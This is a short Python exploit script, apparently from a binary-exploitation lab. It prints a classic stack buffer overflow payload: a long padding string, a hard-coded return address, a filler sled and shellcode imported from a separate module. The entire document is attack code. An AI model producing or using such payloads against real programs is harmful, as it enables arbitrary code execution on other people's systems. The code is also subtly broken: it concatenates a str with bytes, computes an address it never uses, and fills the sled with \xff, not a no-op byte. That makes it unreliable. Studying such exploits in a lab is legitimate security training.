import sys
from shellcode import shellcode
addr = 0xbffef89d.to_bytes(4, "little")
sys.stdout.buffer.write("a"*1036+b"\x48\x5c\xfe\xbf"+b"\xff"*1000+shellcode)
